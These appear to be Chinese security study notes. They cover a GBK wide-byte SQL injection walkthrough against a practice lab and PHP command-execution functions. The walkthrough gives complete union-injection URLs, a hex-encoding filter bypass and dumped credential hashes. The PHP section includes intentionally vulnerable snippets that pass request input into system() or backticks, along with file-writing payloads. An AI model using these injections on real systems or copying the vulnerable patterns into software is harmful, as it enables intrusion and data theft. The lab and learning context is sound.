**magic_quotes_gpc的作用：当PHP的传参中有特殊字符就会再前面加转义字符'\',来做一定的过滤**

单引号和双引号内的一切都是字符串，那我们输入的东西如果不能闭合掉单引号和双引号，我们的输入就不会当作代码执行，就无法产生SQL注入，那我们该怎么办？可以从编码角度吃掉转义字符\

### 原理

前面讲到了GBK编码格式。GBK是双字符编码，那么为什么他们会和渗透测试发送了“巧遇”呢？

**宽字节SQL注入主要是源于程序员设置数据库编码为非英文编码那么就有可能产生宽字节注入 。**

例如说MySql的编码设置为了SET NAMES 'gbk'或是 SET character_set_client =gbk，这样配置会引发编码转换从而导致的注入漏洞。

**宽字节SQL注入的根本原因:**

**宽字节SQL注入就是PHP发送请求到MySql时使用了语句**

**SET NAMES 'gbk' 或是SET character_set_client =gbk 进行了一次编码，但是又由于一些不经意的字符集转换导致了宽字节注入。**

**magic_quotes_gpc的作用：当PHP的传参中有特殊字符就会在前面加转义字符'\',来做一定的过滤**

为了绕过magic_quotes_gpc的\,于是乎我们开始导入宽字节的概念

我们发现\的编码是%5c，然后我们会想到传参一个字符想办法凑成一个gbk字符,例如：‘運’字是%df%5c

SELECT * FROM users WHERE id='1\'' LIMIT 0,1

这条语句因为\使我们无法去注入，那么我们是不是可以用%df吃到%5c,因为如果用GBK编码的话这个就是運，然后成功的让\被吞掉

SELECT * FROM users WHERE id='1�\'#' LIMIT 0,1

**�\ 实际上就是那个運字**

GBK 占用两字节

ASCII占用一字节

PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。

大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 `%df\’` =`%df%5c%27`，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 `%df%5c` 是一个宽字符，也就是 `縗`，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。

### 实践实例

所谓宽字节注入，原理在于开发人员在开发的时候，对传入的参数进行了特殊的函数处理，比如使用了trim()函数，htmlspecialchars()函数，addlashes函数，是可以过滤我们非法提交的参数，从而导致SQL注入无法成功。作为攻击者，要完成的是对参数的拼接，从而导致恶意的SQL语句写入

开始注入，先测试单引号等情况，发现不可行，将id改成-1后页面消失，所以判断存在注入情况

[![img](http://cdn.ayusummer233.top/img/2413639-20211126222901222-1283585992.png)](https://img2020.cnblogs.com/blog/2413639/202111/2413639-20211126222901222-1283585992.png)

之后用宽字节注入方式 %df，原理在于在GBK编码中,反斜杠的编码是%5c,在输入%df后，使得添加反斜杠后形成%df%5c，而%df%5c是繁体字“連”，单引号成功逃逸，爆出Mysql数据库的错误

http://219.153.49.228:48514/new_list.php?id=1 %df'

[![img](http://cdn.ayusummer233.top/img/2413639-20211126222901925-2004633705.png)](https://img2020.cnblogs.com/blog/2413639/202111/2413639-20211126222901925-2004633705.png)

发现报错后，添加注释符，报错消失，判断是单引号闭合

http://219.153.49.228:48514/new_list.php?id=1 %df' %23

[![img](http://cdn.ayusummer233.top/img/2413639-20211126222901948-824653570.png)](https://img2020.cnblogs.com/blog/2413639/202111/2413639-20211126222901948-824653570.png)

**注意：这里很重要的一点，也算是我之前走的坑，这里如果进行测试，#在微软的Edge上是无法实现的，只能使用--+，而在火狐上面则是可以使用%23和--+，同时在这里对注释进行说明，注释分为两种，一种是#，另一种是--(空格)，这里重点说第二种，--是注释符，之后只有在有一个空格的情况下，后面的语句才会被当成注释，但是如果只是--没有空格，则不会当成注释，在SQL语句中+可以作为空格来连接，所以我们避免在注入时，注入点后紧接着一个语句，使得注释符后由于没有空格导致无法形成注释的情况，自己加一个+作为空格，形成注释符，而#在URL里确实有特殊含义，且有些GET型禁止出现#号，所以如果以后#不生效，可以尝试--+**

接下来使用order by语句判断列，发现6会报错，5可以，所以确定为5列

http://219.153.49.228:48514/new_list.php?id=1 %df' order by 5 %23

[![img](http://cdn.ayusummer233.top/img/2413639-20211126222901367-360851620.png)](https://img2020.cnblogs.com/blog/2413639/202111/2413639-20211126222901367-360851620.png)

回显报错位为3和5

http://219.153.49.228:48514/new_list.php?id=-1 %df' union select 1,2,3,4,5 %23

[![img](http://cdn.ayusummer233.top/img/2413639-20211126222901216-1521866462.png)](https://img2020.cnblogs.com/blog/2413639/202111/2413639-20211126222901216-1521866462.png)

获取数据库名为 mozhe_discuz_stormgroup

http://219.153.49.228:48514/new_list.php?id=-1 %df' union select 1,2,database(),4,5 %23

[![img](http://cdn.ayusummer233.top/img/2413639-20211126222901949-1784934307.png)](https://img2020.cnblogs.com/blog/2413639/202111/2413639-20211126222901949-1784934307.png)

获取表名为 notice,stormgroup_member

http://219.153.49.228:48514/new_list.php?id=-1 %df' union select 1,2,database(),4,group_concat(table_name) from information_schema.tables where table_schema=database() %23

[![img](http://cdn.ayusummer233.top/img/2413639-20211126222901344-271263392.png)](https://img2020.cnblogs.com/blog/2413639/202111/2413639-20211126222901344-271263392.png)

获取stormgroup_member表的列名，但是这里对单引号有过滤

http://219.153.49.228:48514/new_list.php?id=-1 %df' union select 1,2,database(),4,group_concat(column_name) from information_schema.columns where table_name='stormgroup_member' %23

[![img](http://cdn.ayusummer233.top/img/2413639-20211126222901343-855047564.png)](https://img2020.cnblogs.com/blog/2413639/202111/2413639-20211126222901343-855047564.png)

修改代码后，发现原有的绕过方式会在数据表中显示编码后的繁体字“連”，思考新的方式

http://219.153.49.228:48514/new_list.php?id=-1 %df' union select 1,2,database(),4,group_concat(column_name) from information_schema.columns where table_name=%df'stormgroup_member%df' %23

[![img](http://cdn.ayusummer233.top/img/2413639-20211126222901282-92871035.png)](https://img2020.cnblogs.com/blog/2413639/202111/2413639-20211126222901282-92871035.png)

后来在百度上发现，可以通过**16进制转换的方式来绕过过滤**，所以先将stormgroup_member进行16进制编码得到0x73746f726d67726f75705f6d656d626572，之后获取列名为 name,password,status

http://219.153.49.228:48514/new_list.php?id=-1 %df' union select 1,2,database(),4,group_concat(column_name) from information_schema.columns where table_name=0x73746f726d67726f75705f6d656d626572 %23

[![img](http://cdn.ayusummer233.top/img/2413639-20211126222901240-2123960819.png)](https://img2020.cnblogs.com/blog/2413639/202111/2413639-20211126222901240-2123960819.png)

随后获取name和password数据为 mozhe，3114b433dece9180717f2b7de56b28a3 和 mozhe，0959ad23e725f2a5e2acfa3344b479e4

http://219.153.49.228:48514/new_list.php?id=-1 %df' union select 1,2,database(),4,group_concat(name,0x7e,password) from mozhe_discuz_stormgroup.stormgroup_member %23

[![img](http://cdn.ayusummer233.top/img/2413639-20211126222901921-1228764756.png)](https://img2020.cnblogs.com/blog/2413639/202111/2413639-20211126222901921-1228764756.png)

解密后获得账号密码，输入后获取key

[![img](http://cdn.ayusummer233.top/img/2413639-20211126222901504-929107284.png)](https://img2020.cnblogs.com/blog/2413639/202111/2413639-20211126222901504-929107284.png)

**总结**

打这个靶场还是收获颇丰的，首先知道了宽字节注入的绕过原理和方法，其次是发现有的浏览器对不同的注释以及编码的不同要求导致会误判，所以以后在进行初步判断时要更加的全面，因为只有判断正确，之后的注入才可以继续下去，刚开始就错了也就没有继续的必要了

同时也收获了宽字节注入的具体流程，之前的笔记只知道原理，并没有完整的实操过，这一次了解到在传统UNION联合注入过程中，针对存在过滤的情况，如何调整代码来绕过防御，在学到竟然可以通过16进制的方式传递数据时，着实打开了一扇新的大门，随后顺着这个线索知道对于其它字符的绕过，相关知识网上也有很多博客，之后也要找时间学习和整理一下

## 命令执行漏洞利用学习和复现

### 漏洞描述

命令执行漏洞是指的服务器没有对执行的命令进行过滤， 用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一

如PHP的命令执行漏洞主要是基于一些函数的参数过滤不足导致，可以执行命令的函数有system( )、exec( )、shell_exec( )、passthru( )、pcntl_execl( )、popen( )、proc_open( )等，当攻击者可以控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击
PHP执行命令是继承WebServer用户的权限，这个用户一般都有权限向Web目录写文件，可见该漏洞的危害性相当大

### 漏洞原理

应用程序有时需要调用一些执行系统命令的函数,如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令，当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行漏洞

### 漏洞危害

- 继承Web服务器程序的权限，去执行系统命令或读写文件
- 反弹shell
- 控制整个网站，甚至控制整个服务器
- 进一步内网渗透

### 漏洞产生的原因

1. 没有对用户输入进行过滤或过滤不严
   例如，没有过滤&、&&、|、||等连接符
   
   商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：system(“/bin/program --arg $arg”);
   
2. 系统漏洞造成的命令执行
   bash破壳漏洞(CVE-2014-6271)，该漏洞可以构造环境变量的值来执行具有攻击力的脚本代码，会影响到bash交互的多种应用，如http、ssh和dhcp等

3. 调用的第三方组件存在代码执行漏洞(**应用调用执行系统命令的函数**)
   例如：
   php(system()、shell_exec()、exec()、eval())
   JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等)
   ThinkPHP命令执行

### 命令执行和代码执行的区别

- 代码执行：执行效果完全依赖于语言本身
- 命令执行：执行效果不受语言本身、命令本身的限制

### 危险函数

1.PHP 代码相关

eval()
assert()
preg_replace
call_user_func()
call_user_func_array()
create_function
array_map()

2.系统命令执行相关

system()
passthru()
exec()
pcntl_exec()
shell_exec()
popen()
proc_open()
`(反单引号)
ob_start()

3.特殊函数

phpinfo()
\#这个文件里面包含了PHP的编译选项，启动的扩展、版本、服务器配置信息、环境变量、操作系统信息、path变量等非常重要的敏感配置信息
symlink()：
\#一般是在linux服务器上使用的，为一个目标建立一个连接，在读取这个链接所连接的文件的内容，并返回内容
getenv
\#获取一个环境变量的值
putenv($a)
\#添加$a到服务器环境变量，但环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态

### 漏洞类型

#### 远程命令执行漏洞

**远程命令执行漏洞，指用户通过浏览器提交执行操作命令， 由于服务器端，没有针对执行函数做过滤，就执行了恶意命令**

#### 远程代码执行漏洞

**代码执行漏洞也叫代码注入漏洞，指用户通过浏览器 提交执行恶意脚本代码，执行恶意构造的脚本代码**

### 命令执行的类型

- 代码层过滤不严格
- 系统漏洞造成命令注入
- 调用的第三方组件存在代码执行漏洞

### Linux危险操作

#### `(反单引号)  Linux和PHP都支持

![image-20221009173245193](http://cdn.ayusummer233.top/img/image-20221009173245193.png)

**反引号 `**   Linux中会执行``内的内容  下面的命令先执行ls  将ls的内容作为命令再次执行

![image-20220930181519745](http://cdn.ayusummer233.top/img/image-20220930181519745.png)

shell_exec() 函数实际上仅是反撇号 \` 操作符的变体，当禁用shell_exec时，` 也不可执行

> `在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回

PHP 支持一个执行运算符：反引号\`\`。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符“`”的效果与函数 [shell_exec()](https://www.php.net/manual/zh/function.shell-exec.php) 相同。

```
<?php$output = `ls -al`;echo "<pre>$output</pre>";?>
```

> **注意**:
>
> 关闭了 [shell_exec()](https://www.php.net/manual/zh/function.shell-exec.php) 时反引号运算符是无效的。

> **注意**:
>
> 与其它某些语言不同，反引号不能在双引号字符串中使用。

<?php highlight_file(__FILE__); if(isset($_REQUEST['url'])){    $url = ($_REQUEST['url']);    echo `$url`; } ?>

![image-20220923150114608](http://cdn.ayusummer233.top/img/image-20220923150114608.png)

### PHP危险函数利用

php将变量转换成字符串的方法：使用内置函数**strval** ()，语法为“strval (var)”，其中var可以是任何标量类型；strval ()函数可以获取变量的字符串值并返回，但不能用于数组或对象。

#### system

（PHP 4,PHP 5,PHP 7,PHP 8）

> system - 执行外部程序，并且显示输出的最后一行

说明

```c
system(string $command,int &$return_var = ?):string
//command参数是要执行的命令，
//return_var参数存放返回的值，可不写该参数
```

同C版本的system()函数一样，本函数执行command参数所指定的命令，并且输出执行结果。

如果PHP运行在服务器模块中，system（）函数还会尝试在每行输出完毕之后，自动刷新web服务器的输出缓存。

如果要获取一个命令未经任何处理的原始输出，请使用passthru()函数

参数

> command   要执行的命令

> return_var  如果要提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中。 &用来使函数内部改变外部的值   是引用参数

返回值

> 成功则返回`命令输出的最后一行`，失败则返回false

```php
<?php
highlight_file(__FILE__);

if(isset($_REQUEST['url'])){
    $url = ($_REQUEST['url']);
    $b = system($url, $a);
    echo $a.PHP_EOL;
    echo $b.PHP_EOL;
}
?>
```

恶意代码执行

?url = dir

![image-20220923113014419](http://cdn.ayusummer233.top/img/image-20220923113014419.png)

?url=echo 123>1.txt

![image-20220923113317996](http://cdn.ayusummer233.top/img/image-20220923113317996.png)

```php

<?php 
	$cmd = 'ls /';
	$output = system($cmd,$resCode);
	echo $resCode == 0 ? '执行成功!':'执行失败',PHP_EOL,PHP_EOL;
 
	echo $output;
?>
```

![image-20220926111443104](http://cdn.ayusummer233.top/img/image-20220926111443104.png)

#### passthru

(PHP 4,PHP 5,PHP 7,PHP 8)

> passthru - 执行外部程序并且显示原始输出

说明

```
passthru(string $command,int &$return_var = ？)：void

// command 为执行的命令
// 状态码
```

同exec()函数类似，passthru()函数也是用来执行外部命令(command)的。当所执行的Unix命令输出二进制数据，并且需要直接传送到浏览器的时候，需要用此函数来代替exec()或者system()函数。常用来执行诸如pbmplus之类的可以直接输出图像流的命令。通过设置Content-type为image/gif，然后调用pbmplus程序输出gif文件就可以从PHP脚本中直接输出图像到浏览器。

参数

> command  要执行的命令

> return_var 如果提供return_var参数，Unix命令的返回状态会被记录到此参数中

返回值

> 没有返回值

```php
<?php
highlight_file(__FILE__);

if(isset($_REQUEST['url'])){
    $url = ($_REQUEST['url']);
    passthru($url,$a);
    echo $a.PHP_EOL;
}
?>
```

文件写入

?url=dir > 22.txt

![image-20220923135357820](http://cdn.ayusummer233.top/img/image-20220923135357820.png)



#### exec

(PHP 4,PHP 5,PHP 7, PHP 8)

> exec  执行一个外部程序  命令执行的结果的最后一行内容 exec要有echo才有回显

说明

```php
exec(string $command,array &$output = ?,int &$return_var = ?):string
    
//command参数是要执行的命令
//output数组是保存输出结果
//return_var整形用来保存命令执行后的状态码，0代表执行成功，1代表执行失败
```

exec()执行command参数所指定的命令

参数

command  所要执行的命令

output

>如果 提供了output参数，那么会用命令执行的输出填充此数组，每行输出他填充数组中的一个元素。数组中的数据不包含行尾的空白字符，例如'\n'字符。请注意，如果数组中已经包含了部分元素，exec()函数会在数组末尾追加内容，如果不想在数组末尾进行追加，请在传入exec()函数之前，对数组使用unset()函数进行重置。

return_var

> 如果同时提供output和return_var 参数，命令执行后的返回状态会被写入到此变量

返回值

> 命令执行的结果的最后一行内容，如果要打印执行结果，需[遍历](https://so.csdn.net/so/search?q=遍历&spm=1001.2101.3001.7020)打印output数组，如果需要获取未经处理的全部输出数据，使用passthru()函数   

如果想要获取命令的输出内容，使用output参数

需要注意的一点exec要有echo才有回显

```php
<?php
highlight_file(__FILE__);

if(isset($_REQUEST['url'])){
    $url = ($_REQUEST['url']);
    echo exec($url);
}
?>
```

?url=whoami

![image-20220923144123190](http://cdn.ayusummer233.top/img/image-20220923144123190.png)

?url=echo flag{this_is_flag} > flag.php

![image-20220923144235173](http://cdn.ayusummer233.top/img/image-20220923144235173.png)



```php

<?php
	$command = 'ls /';
	$ret=exec($command,$output,$a);
 
	#默认只返回第一行结果
	echo "第一行结果:".$ret,PHP_EOL,PHP_EOL;
 
	#打印出执行状态码
	echo "Status: ",$a,PHP_EOL,PHP_EOL;
 
	#数组的长度
	$length=count($output);    
	  for($i=0;$i<$length;$i++){
	  	echo $output[$i];
	  	echo PHP_EOL;
	}

```

![image-20220926111151742](http://cdn.ayusummer233.top/img/image-20220926111151742.png)

#### shell_exec

(PHP 4,PHP 5,PHP 7, PHP 8)

> shell_exec 通过shell环境执行命令，并且将完整的输出以字符串的方式返回  以字符串的形式，返回所有结果

```
shell_exec(string $cmd):string

// cmd 要执行的命令
// 返回结果string
```

本函数同执行操作符  `

> 在Windows上，底层管道以文本模式打开，这可能导致函数无法进行二进制输出。考虑在这种情况下使用popen()。

参数

cmd 要执行的命令

返回值

> 命令执行的输出，如果执行过程中发生错误或者进程不产生输出，则返回null

shell_exec()函数默认无回显，通过 echo 可将执行结果输出到页面

>当进程执行过程中发生错误，或者进程不产生输出的情况下，都会返回null，所以，使用本函数无法通过返回值检测进程是否成功执行。如果需要检查进程执行的退出码，请使用exec()函数。

```php
<?php
highlight_file(__FILE__);

if(isset($_REQUEST['url'])){
    $url = ($_REQUEST['url']);
    echo shell_exec($url);
}
?>
```

?url=ls

![image-20220923145938132](http://cdn.ayusummer233.top/img/image-20220923145938132.png)

?url=dir

![image-20220923150002705](http://cdn.ayusummer233.top/img/image-20220923150002705.png)

?url=echo flag{this_is_flag} > flag.php

![image-20220923150045085](http://cdn.ayusummer233.top/img/image-20220923150045085.png)



#### popen

(PHP 4, PHP 5, PHP 7, PHP 8)

popen — 打开进程文件指针

```php
popen(string $command, string $mode): resource
    
//打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。
//返回一个和 fopen() 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）
//并且必须用 pclose() 来关闭。此指针可以用于 fgets()，fgetss() 和 fwrite()
```

`popen()`打开一个指向进程的管道，该进程由派生给定的`command`命令执行而产生。

参数

> 函数需要两个参数，一个是执行的命令`command`，另外一个是指针文件的连接模式`mode`，有`r`和`w`代表读和写。

函数不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行。

返回值

> 返回一个和`fopen()`所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用`pclose()`来关闭。pclose — 关闭进程文件指针
>
> 此指针可以用于`fgets()`，`fgetss()`和 `fwrite()`
>
> 当模式为 'r'，返回的文件指针等于命令的 STDOUT，当模式为 'w'，返回的文件指针等于命令的 STDIN。
>
> 如果出错返回 **`false`**。

例子：

```php
<?php
$handle = popen("/bin/ls", "r");
?>
```

```php
<?php
  $command='ls /';
  $fd = popen($command, 'r'); 
  while($s=fgets($fd)){
    print_r($s);
  }
?>
```

如果未找到要执行的命令，会返回一个合法的资源。这看上去很怪，但有道理。它允许访问 shell 返回的任何错误信息

```php
<?php
error_reporting(E_ALL);

/* 加入重定向以得到标准错误输出 stderr。 */
$handle = popen('/path/to/executable 2>&1', 'r');
echo "'$handle'; " . gettype($handle) . "\n";
$read = fread($handle, 2096);
echo $read;
pclose($handle);
?>
```

- [pclose()](https://www.php.net/manual/zh/function.pclose.php) - 关闭进程文件指针
- [fopen()](https://www.php.net/manual/zh/function.fopen.php) - 打开文件或者 URL
- [proc_open()](https://www.php.net/manual/zh/function.proc-open.php) - 执行一个命令，并且打开用来输入/输出的文件指针。

#### proc_open

proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。类似 [popen()](https://www.php.net/manual/zh/function.popen.php) 函数， 但是 **proc_open()** 提供了更加强大的控制程序执行的能力。

(PHP 4 >= 4.3.0, PHP 5, PHP 7, PHP 8)

proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。

proc_open 用法稍显复杂，通常其他函数被过滤时，可以考虑使用此函数

```
resource proc_open (string $cmd ,array $descriptorspec ,array &$pipes [, string $cwd [, array $env [, array $other_options ]]])
```

与Popen函数类似，但是可以提供双向管道

```php
proc_open(
    array|string $command,
    array $descriptor_spec,
    array &$pipes,
    ?string $cwd = null,  #?表示可以在使用时不传递此参数
    ?array $env_vars = null,
    ?array $options = null
): resource|false
```

参数：

commad

以 string 形式执行的命令行。特殊字符必须经过转义，并且使用正确的引号。

> **注意**: 在 *Windows* 上, 除非在 `options` 中 把 `bypass_shell` 设置为 **`true`** ，否则 `command` 会被传递给 **cmd.exe** （实际上是 `%ComSpec%`） 其中的 `/c` 标志是 *未加引号的* 字符串 （也就是和 **proc_open()** 一样）。 这可能会导致 **cmd.exe** 删除 `command` 中的引号 （详见 **cmd.exe** 文档）， 从而导致意外的，甚至是潜在的危险行为，因为 **cmd.exe** 错误消息可能包含 （部分） 传递的 `command` （见下面的例子）。

从 PHP 7.4.0 开始，`command` 参数可以使用 array 类型传递。 在这种情况下，进程将直接打开（不通过 shell ）。 而 PHP 会处理任何必要的参数转义。

> **注意**:
>
> 在 Windows 上， array 元素的参数转义假定 执行命令的命令行解析与 VC 运行时进行的命令行参数解析兼容。

descriptor_spec

一个索引数组。 数组的键表示描述符，数组元素值表示 PHP 如何将这些描述符传送至子进程。 0 表示标准输入（stdin），1 表示标准输出（stdout），2 表示标准错误（stderr）。

数组中的元素可以是：

- 包含了要传送至进程的管道的描述信息的数组。第一个元素为描述符类型，第二个元素是针对该描述符的选项。有效的类型有：`pipe`（第二个元素可以是：`r` 向进程传送该管道的读取端，`w` 向进程传送该管道的写入端），以及 `file`（第二个元素的第二个元素为文件名）。注意除了 `w` 之外的任何内容都视为 `r`。
- 流资源表示真实文件描述符（例如：已打开的文件，套接字，**`STDIN`**）。

文件描述符的值不限于 0，1 和 2，你可以使用任何有效的文件描述符 并将其传送至子进程。 这使得你的脚本可以和其他脚本交互操作。 例如，可以通过指定文件描述符将密码以更加安全的方式 传送至诸如 PGP，GPG 和 openssl 程序， 同时也可以很方便的获取这些程序的状态信息。

pipes

将被置为索引数组， 其中的元素是被执行程序创建的管道对应到 PHP 这一端的文件指针。

cwd

要执行命令的初始工作目录。 必须是 *绝对* 路径， 设置此参数为 **`null`** 表示使用默认值（当前 PHP 进程的工作目录）。

env_vars

要执行的命令所使用的环境变量。 设置此参数为 **`null`** 表示使用和当前 PHP 进程相同的环境变量。

options

你还可以指定一些附加选项。 目前支持的选项包括：

- `suppress_errors` （仅用于 Windows 平台）： 设置为 **`true`** 表示抑制本函数产生的错误。
- `bypass_shell` （仅用于 Windows 平台）： 设置为 **`true`** 表示绕过 `cmd.exe` shell。
- `blocking_pipes` （仅用于 Windows 平台）： 设置为 **`true`** 表示强制堵塞管道。
- `create_process_group` （仅用于 Windows 平台）： 设置为 **`true`** 表示允许子进程处理 `CTRL` 事件。
- `create_new_console` （仅用于 Windows 平台）： 表示新进程有一个新的控制台，用于代替父进程的控制台。

返回值

返回表示进程的资源类型， 当使用完毕之后，请调用 [proc_close()](https://www.php.net/manual/zh/function.proc-close.php) 函数来关闭此资源。 如果失败，返回 **`false`**。

| 版本  | 说明                                                  |
| :---- | :---------------------------------------------------- |
| 7.4.4 | 为 `options` 参数增加 `create_new_console` 选项。     |
| 7.4.0 | **proc_open()** 的 `command` 参数现在也允许数组类型。 |
| 7.4.0 | 为 `options` 参数增加 `create_process_group` 选项。   |

例子：

```php
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // 标准输入，子进程从此管道中读取数据
   1 => array("pipe", "w"),  // 标准输出，子进程向此管道中写入数据
   2 => array("file", "/tmp/error-output.txt", "a") // 标准错误，写入到一个文件
);

$cwd = '/tmp';
$env = array('some_option' => 'aeiou');

$process = proc_open('php', $descriptorspec, $pipes, $cwd, $env);

if (is_resource($process)) {
    // $pipes 现在看起来是这样的：
    // 0 => 可以向子进程标准输入写入的句柄
    // 1 => 可以从子进程标准输出读取的句柄
    // 错误输出将被追加到文件 /tmp/error-output.txt

    fwrite($pipes[0], '<?php print_r($_ENV); ?>');
    fclose($pipes[0]);

    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);
    

    // 切记：在调用 proc_close 之前关闭所有的管道以避免死锁。
    $return_value = proc_close($process);

    echo "command returned $return_value\n";
}
?>
```

输出：

```
Array
(
    [some_option] => aeiou
    [PWD] => /tmp
    [SHLVL] => 1
    [_] => /usr/local/bin/php
)
command returned 0
```

虽然人们可能期望下面的程序能够搜索文件 filename.txt 进行文本搜索， 并打印结果，但它的行为相当不同。

```
<?php$descriptorspec = [STDIN, STDOUT, STDOUT];$cmd = '"findstr" "search" "filename.txt"';$proc = proc_open($cmd, $descriptorspec, $pipes);proc_close($proc);?>
```

以上例程会输出：

```
'findstr" "search" "filename.txt' is not recognized as an internal or external command,
operable program or batch file.
```

要解决该行为，通常只需将 `command` 加上引号：

```
$cmd = '""findstr" "search" "filename.txt""';
```

**注意**:

Windows 兼容性：超过 2 的描述符也可以作为可继承的句柄传送到子进程。 但是，由于 Windows 的架构并不将文件描述符和底层句柄进行关联， 所以，子进程无法访问这样的句柄。 标准输入，标准输出和标注错误会按照预期工作。  如果只需要单向的进程管道， 使用 [popen()](https://www.php.net/manual/zh/function.popen.php) 函数会更加简单。

- [popen()](https://www.php.net/manual/zh/function.popen.php) - 打开进程文件指针
- [exec()](https://www.php.net/manual/zh/function.exec.php) - 执行一个外部程序
- [system()](https://www.php.net/manual/zh/function.system.php) - 执行外部程序，并且显示输出
- [passthru()](https://www.php.net/manual/zh/function.passthru.php) - 执行外部程序并且显示原始输出
- [stream_select()](https://www.php.net/manual/zh/function.stream-select.php) - Runs the equivalent of the select() system call on the given arrays of streams with a timeout specified by seconds and microseconds
- The [执行运算符](https://www.php.net/manual/zh/language.operators.execution.php)

#### shell_exec

(PHP 4, PHP 5, PHP 7, PHP 8)

shell_exec — 通过 shell 执行命令并将完整的输出以字符串的方式返回

```php
shell_exec(string $command): string|false|null
```

本函数同[执行运算符](https://www.php.net/manual/zh/language.operators.execution.php)。

> **注意**:
>
> 在 Windows 上，底层管道以文本模式打开，这可能导致函数无法进行二进制输出。考虑使用 [popen()](https://www.php.net/manual/zh/function.popen.php) 避免这种情况。

参数

- `command`

  要执行的命令。

返回值

string 包含已执行命令的输出，如果无法建立管道，则为 **`false`**，如果发生错误或者命令不产生输出则为 **`null`**

> **注意**:
>
> 当进程执行过程中发生错误，或者进程不产生输出的情况下，都会返回 **`null`**。使用本函数无法检测执行是否成功。当需要访问程序退出代码时，应使用 [exec()](https://www.php.net/manual/zh/function.exec.php)。

错误、异常

无法建立管道时会产生 **`E_WARNING`** 级别的错误。

#### array_map

[PHP: array_map - Manual](https://www.php.net/manual/zh/function.array-map.php)

- [array_filter()](https://www.php.net/manual/zh/function.array-filter.php) - 使用回调函数过滤数组的元素
- [array_reduce()](https://www.php.net/manual/zh/function.array-reduce.php) - 用回调函数迭代地将数组简化为单一的值
- [array_walk()](https://www.php.net/manual/zh/function.array-walk.php) - 使用用户自定义函数对数组中的每个元素做回调处理

(PHP 4 >= 4.0.6, PHP 5, PHP 7, PHP 8)

array_map — 为数组的每个元素应用回调函数

> 说明

```
array_map(?callable $callback, array $array, array ...$arrays): array
```

**array_map()** 返回一个 array，内容为参数中多个 `array` 的元素按相应的顺序调用 `callback` 后的结果（如果提供了更多数组，还会利用 `arrays` 传入）。

传入两个及以上的数组时，它们元素数量将会相同。因为回调函数会并行地处理相互对应的元素。 如果几个数组的元素数量不一致：空元素会扩展短那个数组，直到长度和最长的数组一样。

`callback` 函数形参的数量必须匹配 **array_map()** 实参中数组的数量。多余的实参数组将会被忽略。如果提供的实参数组的数量不足，将抛出 [ArgumentCountError](https://www.php.net/manual/zh/class.argumentcounterror.php)。

> 参数

callback：

回调函数 [callable](https://www.php.net/manual/zh/language.types.callable.php)，应用到参数中的的每个数组里的每个元素。

h合并多个数组为一个多维数组时，可以将`callback` 可以设置为 **`null`**。 如果只提供了 `array` 一个数组， **array_map()** 会返回输入的数组。

array：

数组，遍历数组的元素来运行 `callback` 函数。如果有多个array，则遍历多个array，每次从多个array中取出共同索引位置的元素作为callback函数的参数

arrays：

额外的数组列表，每个都遍历运行 `callback` 函数。

> 返回值

返回数组，包含 `callback` 函数处理之后 `array` (有多个数组时，为 `arrays`) 对应索引的所有元素。

当仅仅传入一个数组时，返回的数组会保留传入参数的键（key）。 传入多个数组时，返回的数组键是按顺序的 integer。

> 版本信息

| 版本  | 说明                                                         |
| :---- | :----------------------------------------------------------- |
| 8.0.0 | 如果 `callback` 接受引用传递参数，该方法将会抛出 **`E_WARNING`**。 |

print_r是一个专门打印数据内容的函数

> 范例

示例 #1array_map() 例子

```php
<?php
function cube($n)
{
    return ($n * $n * $n);
}

$a = [1, 2, 3, 4, 5];
$b = array_map('cube', $a);
print_r($b);
?>
```

这使得 $b 成为：

```
Array
(
    [0] => 1  //  =>  表示存储的是
    [1] => 8
    [2] => 27
    [3] => 64
    [4] => 125
)
```

示例 #2 array_map()使用匿名函数

```php
<?php
$func = function(int $value): int {
    return $value * 2;
};

print_r(array_map($func, range(1, 5)));

// 或者从 PHP 7.4.0 起：

print_r(array_map(fn($value): int => $value * 2, range(1, 5)));  // =>表示函数体是
//fn($value):int => $value*2  表示匿名函数参数是$value  返回值是int类型   函数体是return $value*2;
?>
```

输出

```
Array
(
    [0] => 2
    [1] => 4
    [2] => 6
    [3] => 8
    [4] => 10
)
```

示例 #3 array_map()：使用更多的数组

```php
<?php
function show_Spanish(int $n, string $m): string
{
    return "The number {$n} is called {$m} in Spanish";
}

function map_Spanish(int $n, string $m): array
{
    return [$n => $m]; //  返回数组  数组只有一个元素  键是int   值是string
}

$a = [1, 2, 3, 4, 5];
$b = ['uno', 'dos', 'tres', 'cuatro', 'cinco'];

$c = array_map('show_Spanish', $a, $b);
print_r($c);

$d = array_map('map_Spanish', $a , $b);
print_r($d);
?>
```

以上例程会输出：

```
// 打印 $c
Array
(
    [0] => The number 1 is called uno in Spanish
    [1] => The number 2 is called dos in Spanish
    [2] => The number 3 is called tres in Spanish
    [3] => The number 4 is called cuatro in Spanish
    [4] => The number 5 is called cinco in Spanish
)

// 打印 $d
Array
(
    [0] => Array
        (
            [1] => uno //  1  是键   uno是值
        )

    [1] => Array
        (
            [2] => dos
        )

    [2] => Array
        (
            [3] => tres
        )

    [3] => Array
        (
            [4] => cuatro
        )
